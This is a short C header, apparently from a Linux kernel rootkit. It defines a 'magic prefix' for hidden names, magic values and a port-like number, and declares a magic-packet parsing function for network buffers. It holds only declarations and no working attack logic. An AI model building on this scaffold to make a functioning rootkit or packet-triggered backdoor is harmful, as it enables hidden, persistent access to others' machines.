#include <linux/init.h>
#include <linux/tcp.h>

// magic prefix
#define PREFIX "br0k3_n0w_h1dd3n"

#define MAGIC_VALUE "br0k3"

#define MAGIC_NUMBER 9995

#define DROP 0
#define ACCEPT 1

unsigned int magic_packet_parse(struct sk_buff *socket_buffer);
